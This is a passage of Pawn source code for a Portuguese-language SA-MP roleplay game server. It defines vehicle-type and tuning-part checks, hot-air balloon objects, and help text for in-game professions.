		default: result = 0;
    }
    return result;
}

stock EUmAviao(vehicleid)
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
    	case 460, 464, 476, 511, 513, 512, 519, 520, 553, 592, 593: result = model;
		default: result = 0;
    }
    return result;
}

stock EUmaBike(vehicleid)//IsABike
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
        case 481, 509, 510: result = model;
        default: result = 0;
    }
	return result;
}

stock EUmaMoto(vehicleid)//IsABikeBike
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
        case 461, 462, 463, 448, 468, 471, 521, 522, 523, 581, 586: result = model;
        default: result = 0;
    }
	return result;
}

stock EUmBarco(vehicleid)//IsABarco
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
        case 430, 446, 452, 453, 454, 472, 473, 484, 493, 595: result = model;
        default: result = 0;
    }
	return result;
}

stock IsCasaIlha(C)
{
	if(C == 357 || C == 133 || C == 134 || C == 135 || C == 136 || C == 137 || C == 138 || C == 139 || C == 154 || C == 140 ||
		C == 358 || C == 142 || C == 143 || C == 144 || C == 145 || C == 146 || C == 147 || C == 148 || C == 149 || C == 150 ||
		C == 359 || C == 152 || C == 132 || C == 133 || C == 134 || C == 135 || C == 136 || C == 137 || C == 138 || C == 139 ||
		C == 360 || C == 140 || C == 141 || C == 142 || C == 143 || C == 144 || C == 145 || C == 146 || C == 147 || C == 148 ||
		C == 361 || C == 150 || C == 151 || C == 152) return true;
		else return false;
}

stock IsCasaVila(C)
{
	if(C == 320 || C == 321 || C == 322 || C == 323 || C == 324 || C == 325 || C == 320 || C == 321 || C == 322 || C == 323 || C == 324 || C == 325) return true;
		else return false;
}

stock CriarBalaoInGame(IDBalao, IDdono, Float:Bx, Float:By, Float:Bz)
{
	format(gStr, sizeof(gStr), "Baloes/Balao%d.ini", IDBalao);
	if(!fexist(gStr))
	{
	    WE_CreateFile(gStr);
	    WE_SetString(gStr, "bDono", PlayerName(IDdono));
	    WE_SetInt(gStr, "bModelo", 19335);
	    WE_SetString(gStr, "bMensagem", "Nenhuma");
	    WE_SetInt(gStr, "bVelocidade", 1);
	    WE_SetFloat(gStr, "balaox", Bx);
	    WE_SetFloat(gStr, "balaoy", By);
	    WE_SetFloat(gStr, "balaoz", Bz);
	    bInfo[IDBalao][BalaoID] = CreateDynamicObject(19335, Bx, By, Bz, 0.0, 0.0, 0.0);
	}
	else
	{
		bInfo[IDBalao][BalaoID] = CreateDynamicObject(WE_GetInt(gStr, "bModelo"), WE_GetFloat(gStr, "balaox"), WE_GetFloat(gStr, "balaoy"), WE_GetFloat(gStr, "balaoz"), 0.0, 0.0, 0.0);
 	}
    bInfo[IDBalao][ObjectFogo] = CreateDynamicObject(18692, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00);
    bInfo[IDBalao][ObjectFogo1] = CreateDynamicObject(18692, 0.00, 0.00, 0.00, 0.00, 0.00, 0.00);
	AttachObjectToObject(bInfo[IDBalao][ObjectFogo], bInfo[IDBalao][BalaoID], 0.0, 0.0, 2.0, 0.0, 0.0, 0.0, 1);
    AttachObjectToObject(bInfo[IDBalao][ObjectFogo1], bInfo[IDBalao][BalaoID], 0.0, 0.0, 4.0, 0.0, 0.0, 0.0, 1);
	new
		gName[MAX_PLAYER_NAME + 1]
	;
	GetPlayerName(IDdono, gName, sizeof(gName));
	format(bInfo[IDBalao][BalaoDono], MAX_PLAYER_NAME, gName);
 	bInfo[IDBalao][posBalaoX] = Bx;
 	bInfo[IDBalao][posBalaoY] = By;
 	bInfo[IDBalao][posBalaoZ] = Bz;
 	bInfo[IDBalao][posBOX] = Bx;
 	bInfo[IDBalao][posBOY] = By;
 	bInfo[IDBalao][posBOZ] = Bz;
}

forward MoverBalao(playerid);
public MoverBalao(playerid)
{
    if(bpInfo[playerid][Direcao] != 0)
    {
		for(new balaoid = 0; balaoid < MAX_BALOES; ++balaoid)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, bInfo[balaoid][posBalaoX], bInfo[balaoid][posBalaoY], bInfo[balaoid][posBalaoZ]))
			{
			    new
					Float:GBX, Float:GBY, Float:GBZ
				;
				GetDynamicObjectPos(bInfo[balaoid][BalaoID], GBX, GBY, GBZ);
				if(bpInfo[playerid][Direcao] == 1)
				{
					MoveDynamicObject(bInfo[balaoid][BalaoID], GBX, GBY, GBZ+0.1, 10.0);
				   	bInfo[balaoid][posBalaoX] = GBX;
				 	bInfo[balaoid][posBalaoY] = GBY;
				 	bInfo[balaoid][posBalaoZ] = GBZ+0.1;
			 	}
	   			if(bpInfo[playerid][Direcao] == 2)
				{
					MoveDynamicObject(bInfo[balaoid][BalaoID], GBX, GBY, GBZ-0.1, 10.0);
				   	bInfo[balaoid][posBalaoX] = GBX;
				 	bInfo[balaoid][posBalaoY] = GBY;
				 	bInfo[balaoid][posBalaoZ] = GBZ-0.1;
			 	}
			 	if(bpInfo[playerid][Direcao] == 3)
				{
					MoveDynamicObject(bInfo[balaoid][BalaoID], GBX, GBY+0.5, GBZ, 10.0);
				   	bInfo[balaoid][posBalaoX] = GBX;
				 	bInfo[balaoid][posBalaoY] = GBY+0.5;
				 	bInfo[balaoid][posBalaoZ] = GBZ;
			 	}
			 	if(bpInfo[playerid][Direcao] == 4)
				{
					MoveDynamicObject(bInfo[balaoid][BalaoID], GBX, GBY-0.5, GBZ, 10.0);
				   	bInfo[balaoid][posBalaoX] = GBX;
				 	bInfo[balaoid][posBalaoY] = GBY-0.5;
				 	bInfo[balaoid][posBalaoZ] = GBZ;
			 	}
			 	if(bpInfo[playerid][Direcao] == 5)
				{
					MoveDynamicObject(bInfo[balaoid][BalaoID], GBX+0.5, GBY, GBZ, 10.0);
				   	bInfo[balaoid][posBalaoX] = GBX+0.5;
				 	bInfo[balaoid][posBalaoY] = GBY;
				 	bInfo[balaoid][posBalaoZ] = GBZ;
			 	}
			 	if(bpInfo[playerid][Direcao] == 6)
				{
					MoveDynamicObject(bInfo[balaoid][BalaoID], GBX-0.5, GBY, GBZ, 10.0);
				   	bInfo[balaoid][posBalaoX] = GBX-0.5;
				 	bInfo[balaoid][posBalaoY] = GBY;
				 	bInfo[balaoid][posBalaoZ] = GBZ;
			 	}
			 	bpInfo[playerid][timerBalao] = SetTimerEx("MoverBalao", 30, false, "d", playerid);
			}
		}
	}
	return 1;
}

stock eNitro(NitroID)
{
	if(NitroID == 1008
	|| NitroID == 1009
	|| NitroID == 1010) return true;
	else return false;
}

stock eRoda(rodaID)
{
	if(rodaID == 1025
	|| rodaID == 1073
	|| rodaID == 1074
	|| rodaID == 1075
	|| rodaID == 1076
    || rodaID == 1077
    || rodaID == 1078
    || rodaID == 1079
    || rodaID == 1080
    || rodaID == 1081
    || rodaID == 1082
    || rodaID == 1083
    || rodaID == 1084
    || rodaID == 1085
    || rodaID == 1096
    || rodaID == 1097
    || rodaID == 1098) return true;
    else return false;
}

stock eSpoiler(SpoilerID)
{
	if(SpoilerID == 1000
	|| SpoilerID == 1001
	|| SpoilerID == 1002
	|| SpoilerID == 1003
	|| SpoilerID == 1014
	|| SpoilerID == 1015
	|| SpoilerID == 1016
	|| SpoilerID == 1023
	|| SpoilerID == 1058
	|| SpoilerID == 1060
	|| SpoilerID == 1049
	|| SpoilerID == 1050
	|| SpoilerID == 1138
	|| SpoilerID == 1139
	|| SpoilerID == 1146
	|| SpoilerID == 1147
	|| SpoilerID == 1158
	|| SpoilerID == 1162
	|| SpoilerID == 1163
	|| SpoilerID == 1164) return true;
	else return false;
}

stock eHydraulico(HydraulicoID)
{
	if(HydraulicoID == 1087) return true;
	else return false;
}

stock eParachoqueDianteiro(ParaChoqueDianteiroID)
{
    if(ParaChoqueDianteiroID == 1117
    || ParaChoqueDianteiroID == 1152
    || ParaChoqueDianteiroID == 1153
    || ParaChoqueDianteiroID == 1155
    || ParaChoqueDianteiroID == 1157
    || ParaChoqueDianteiroID == 1160
    || ParaChoqueDianteiroID == 1165
    || ParaChoqueDianteiroID == 1167
    || ParaChoqueDianteiroID == 1169
    || ParaChoqueDianteiroID == 1170
    || ParaChoqueDianteiroID == 1171
    || ParaChoqueDianteiroID == 1172
    || ParaChoqueDianteiroID == 1173
    || ParaChoqueDianteiroID == 1174
    || ParaChoqueDianteiroID == 1175
    || ParaChoqueDianteiroID == 1179
    || ParaChoqueDianteiroID == 1181
    || ParaChoqueDianteiroID == 1182
    || ParaChoqueDianteiroID == 1185
    || ParaChoqueDianteiroID == 1188
    || ParaChoqueDianteiroID == 1189
    || ParaChoqueDianteiroID == 1192
    || ParaChoqueDianteiroID == 1193) return true;
    else return false;
}

stock eParachoqueTraseiro(ParaChoqueTraseiroID)
{
	if(ParaChoqueTraseiroID == 1140
    || ParaChoqueTraseiroID == 1141
    || ParaChoqueTraseiroID == 1148
    || ParaChoqueTraseiroID == 1149
    || ParaChoqueTraseiroID == 1150
    || ParaChoqueTraseiroID == 1151
    || ParaChoqueTraseiroID == 1154
    || ParaChoqueTraseiroID == 1156
    || ParaChoqueTraseiroID == 1159
    || ParaChoqueTraseiroID == 1161
    || ParaChoqueTraseiroID == 1166
    || ParaChoqueTraseiroID == 1168
    || ParaChoqueTraseiroID == 1176
    || ParaChoqueTraseiroID == 1177
    || ParaChoqueTraseiroID == 1178
    || ParaChoqueTraseiroID == 1180
    || ParaChoqueTraseiroID == 1183
    || ParaChoqueTraseiroID == 1184
    || ParaChoqueTraseiroID == 1186
    || ParaChoqueTraseiroID == 1187
    || ParaChoqueTraseiroID == 1190
    || ParaChoqueTraseiroID == 1191) return true;
    else return false;
}

stock eEscapamento(EscapamentoID)
{
    if(EscapamentoID == 1018
    || EscapamentoID == 1019
    || EscapamentoID == 1020
    || EscapamentoID == 1021
    || EscapamentoID == 1022
    || EscapamentoID == 1028
    || EscapamentoID == 1029
    || EscapamentoID == 1037
    || EscapamentoID == 1043
    || EscapamentoID == 1044
    || EscapamentoID == 1045
    || EscapamentoID == 1046
    || EscapamentoID == 1059
    || EscapamentoID == 1064
    || EscapamentoID == 1065
    || EscapamentoID == 1066
    || EscapamentoID == 1089
    || EscapamentoID == 1092
    || EscapamentoID == 1104
    || EscapamentoID == 1105
    || EscapamentoID == 1113
    || EscapamentoID == 1114
    || EscapamentoID == 1126
    || EscapamentoID == 1127
    || EscapamentoID == 1129
    || EscapamentoID == 1132
    || EscapamentoID == 1135
    || EscapamentoID == 1034
    || EscapamentoID == 1136) return true;
    else return false;
}

stock eBventr(BventrID)
{
    if(BventrID == 1142
    || BventrID == 1144) return true;
    else return false;
}

stock eBventl(BventlID)
{
    if(BventlID == 1143
    || BventlID ==  1145) return true;
    else return false;
}

stock eBscoop(BscoopID)
{
	if(BscoopID == 1004
	|| BscoopID == 1005
	|| BscoopID == 1011
	|| BscoopID == 1012) return true;
	else return false;
}

stock eRscoop(RscoopID)
{
    if(RscoopID == 1006
    || RscoopID == 1032
    || RscoopID == 1033
    || RscoopID == 1035
    || RscoopID == 1038
    || RscoopID == 1053
    || RscoopID == 1054
    || RscoopID == 1055
    || RscoopID == 1061
    || RscoopID == 1067
    || RscoopID == 1068
    || RscoopID == 1088
    || RscoopID == 1091
    || RscoopID == 1103
    || RscoopID == 1128
    || RscoopID == 1130
    || RscoopID == 1131) return true;
    else return false;
}

stock eLskirt(LskirtID)
{
    if(LskirtID == 1007
    || LskirtID == 1026
    || LskirtID == 1031
    || LskirtID == 1036
    || LskirtID == 1039
    || LskirtID == 1042
    || LskirtID == 1047
    || LskirtID == 1048
    || LskirtID == 1056
    || LskirtID == 1057
    || LskirtID == 1069
    || LskirtID == 1070
    || LskirtID == 1090
    || LskirtID == 1093
    || LskirtID == 1106
    || LskirtID == 1108
    || LskirtID == 1118
    || LskirtID == 1119
    || LskirtID == 1133
    || LskirtID == 1122
    || LskirtID == 1134) return true;
    else return false;
}

stock eRskirt(RskirtID)
{
	if(RskirtID == 1017
    || RskirtID == 1027
    || RskirtID == 1030
    || RskirtID == 1040
    || RskirtID == 1041
    || RskirtID == 1051
    || RskirtID == 1052
    || RskirtID == 1062
    || RskirtID == 1063
    || RskirtID == 1071
    || RskirtID == 1072
    || RskirtID == 1094
    || RskirtID == 1095
    || RskirtID == 1099
    || RskirtID == 1101
    || RskirtID == 1102
    || RskirtID == 1107
    || RskirtID == 1120
    || RskirtID == 1121
    || RskirtID == 1124
    || RskirtID == 1137) return true;
    else return false;
}

stock eBase(BaseID)
{
    if(BaseID == 1086) return true;
    else return false;
}

stock eRbbars(RbbarsID)
{
	if(RbbarsID == 1109
    || RbbarsID == 1110
    || RbbarsID == 1123
    || RbbarsID == 1125) return true;
    else return false;
}

stock eFbbars(FbbarsID)
{
    if(FbbarsID == 1115
    || FbbarsID == 1116) return true;
    else return false;
}

stock eLights(LightsID)
{
	if(LightsID == 1013
	|| LightsID == 1024) return true;
	else return false;
}

stock componenteNome(component)
{
    new
		cName[64]
	;
	if(eNitro(component))
	{
		cName = "Nitro";
	}
	if(eRoda(component))
	{
		cName = "Roda";
	}
	if(eSpoiler(component))
	{
		cName = "Spoiler";
	}
	if(eHydraulico(component))
	{
		cName = "Hydraulico";
	}
	if(eParachoqueDianteiro(component))
	{
		cName = "ParachoqueDianteiro";
	}
	if(eParachoqueTraseiro(component))
	{
		cName = "ParachoqueTraseiro";
	}
	if(eEscapamento(component))
	{
		cName = "Escapamento";
	}
	if(eBventr(component))
	{
		cName = "Bventr";
	}
	if(eBventl(component))
	{
		cName = "Bventl";
	}
	if(eBscoop(component))
	{
		cName = "Bscoop";
	}
	if(eRscoop(component))
	{
		cName = "Rscoop";
	}
	if(eLskirt(component))
	{
		cName = "Lskirt";
	}
	if(eRskirt(component))
	{
		cName = "Rskirt";
	}
	if(eBase(component))
	{
		cName = "Base";
	}
	if(eRbbars(component))
	{
		cName = "Rbbars";
	}
	if(eFbbars(component))
	{
		cName = "Fbbars";
	}
	if(eLights(component))
	{
		cName = "Lights";
	}
	return cName;
}

stock ComandosProf(playerid)
{
	new
		stg[1500]
	;
	// Profissão de desempregado.
	if(pInfo[playerid][Prof] == DESEMPREGADO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Desempregado(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nChat dos desempregados.");
		strcat(stg, gstring);
	}
	// Categoria Transporte
	else if(pInfo[playerid][Prof] == 1)// Motorista de Busão
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Motorista de Ônibus");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nChat dos motorista de ônibus.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /IniciarRota [Texto]\nFunção:\nIniciar a tragetória da rota.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /ProximoPonto\nFunção:\nParar no ponto de ônibus e aguardar 5 segundos.\nE indicar o próximo ponto.");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /PontoFinal\nFunção:\nUsado para concluir a rota no ponto inicial(FINAL).");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Passagem [ID]\nFunção:\nCobra a tarifa de passagem de um(a) jogador(a).");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == TAXISTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Taxista");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) taxistas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Taximetro carro [ID]\nFunção:\nInicia a contagem no taximetro.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == MOTO_TAXISTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Moto Taxista");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) moto taxistas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Taximetro moto [ID]\nFunção:\nInicia a contagem no taximetro.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == PILOTO_PART)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Piloto(a) Particular.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) pilotos particulares.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Mais comandos em breve, aguarde.");
		strcat(stg, gstring);
	}
	// Categoria Transporte público
	else if(pInfo[playerid][Prof] == CAMINHONEIRO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Caminhoneiro(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) caminhoneiros(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Carregar \nFunção:\nCarrega seu caminhão na área de carga.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Descarregar \nFunção:\nDescarrega seu caminhão na área de descarga.");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Dormir \nFunção:\nDorme em seu caminhão.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == MAQUINISTA)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Maquinista");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Maquinistas.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /SairEstacao\nFunção:\nInicia sua rota de viagem.\nVocê deve usar esse comando em todas estações.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /ChegadaFinal\nFunção:\nUsado na estação de inicio para receber pela viagem.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == TRANSPORTADOR)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Transportador(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Transportadores.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /PegarMercadoria \nFunção:\nPega a mercadoria para você entregar.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /eMecardoria\nFunção:\nEntrega a mercadoria.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /mComprovantes\nFunção:\nUsado para entregar os comprovantes e receber pela entregaa.");
		strcat(stg, gstring);
	}
	// Categoria Particulares
	else if(pInfo[playerid][Prof] == SEGURANCA_PART)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Segurança Particular");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) seguranças particulares.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Combine com alguém um valor R$, e o protega.");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == MOTORISTA_PART)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Motorista Particular");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) motoristas particulares.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} Nenhum no momento. (Será atualizado)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF} Combine com alguém um valor R$, e seja o(a) motorista do mesmo(a).");
		strcat(stg, gstring);
	}
	// Categoria Policia
	else if(pInfo[playerid][Prof] == GUARDA_TRANSITO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Guarda de Trânsito");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) guardas de trânsito.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Fone\nFunção: Usa o megaphone (Com áudio).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Desalgemar [ID] [Motivo]\nFunção:\nDesalgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Prender [ID] [Motivo]\nFunção:\nPrende um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Multar [ID] [Quantia] [Motivo]\nFunção:\nMulta um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF0000}ATENÇÃO: {FFFFFF}Leia as regras policiais no fórum e /Motivos!");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == POL_CIVIL)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Policia Civil");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) policiais civil.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Fone\nFunção: Usa o megaphone (Com áudio).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Procurar [ID] [Motivo]\nFunção:\nColoca um(a) jogador(a) na lista de procurados(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /plimparficha [ID] [Motivo]\nFunção:\nRemove da lista de procurados(as) um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Algemar [ID] [Motivo]\nFunção:\nAlgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Desalgemar [ID] [Motivo]\nFunção:\nDesalgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Prender [ID] [Motivo]\nFunção:\nPrende um(a) jogador(a).");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Multar [ID] [Quantia] [Motivo]\nFunção:\nMulta um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CriarTapete\nFunção:\nCria um tapete de pregos para furar pneus.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /RemoverTapete\nFunção:\nRemover um tapete de pregos.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF0000}ATENÇÃO: {FFFFFF}Leia as regras policiais no fórum e /Motivos!");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == POL_MILITAR)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Policia Militar");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) policiais militar.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Fone\nFunção: Usa o megaphone (Com áudio).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Procurar [ID] [Motivo]\nFunção:\nColoca um(a) jogador(a) na lista de procurados(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /plimparficha [ID] [Motivo]\nFunção:\nRemove da lista de procurados(as) um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Algemar [ID] [Motivo]\nFunção:\nAlgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Desalgemar [ID] [Motivo]\nFunção:\nDesalgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Prender [ID] [Motivo]\nFunção:\nPrende um(a) jogador(a).");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Multar [ID] [Quantia] [Motivo]\nFunção:\nMulta um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CriarTapete\nFunção:\nCria um tapete de pregos para furar pneus.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /RemoverTapete\nFunção:\nRemover um tapete de pregos.");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF0000}ATENÇÃO: {FFFFFF}Leia as regras policiais no fórum e /Motivos!");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == POL_RODOVIARIO)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Policial Rodoviário(a)");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Policial Rodoviários(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Fone\nFunção: Usa o megaphone (Com áudio).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Procurar [ID] [Motivo]\nFunção:\nColoca um(a) jogador(a) na lista de procurados(as).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /plimparficha [ID] [Motivo]\nFunção:\nRemove da lista de procurados(as) um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Algemar [ID] [Motivo]\nFunção:\nAlgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Desalgemar [ID] [Motivo]\nFunção:\nDesalgema um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Prender [ID] [Motivo]\nFunção:\nPrende um(a) jogador(a).");
		strcat(stg, gstring);
 		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /Multar [ID] [Quantia] [Motivo]\nFunção:\nMulta um(a) jogador(a).");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF0000}ATENÇÃO: {FFFFFF}Leia as regras policiais no fórum e /Motivos!");
		strcat(stg, gstring);
	}
	else if(pInfo[playerid][Prof] == POL_FEDERAL)
	{
		format(gstring, sizeof(gstring), "{FF1E1E}Auxilio para profissão: Policial Federal");
		strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FFFFFF}{1E90FF}Comando válido:{FFFFFF} /CP [Texto]\nFunção: Chat dos(as) Policiais Federais.");
		strcat(stg, gstring);
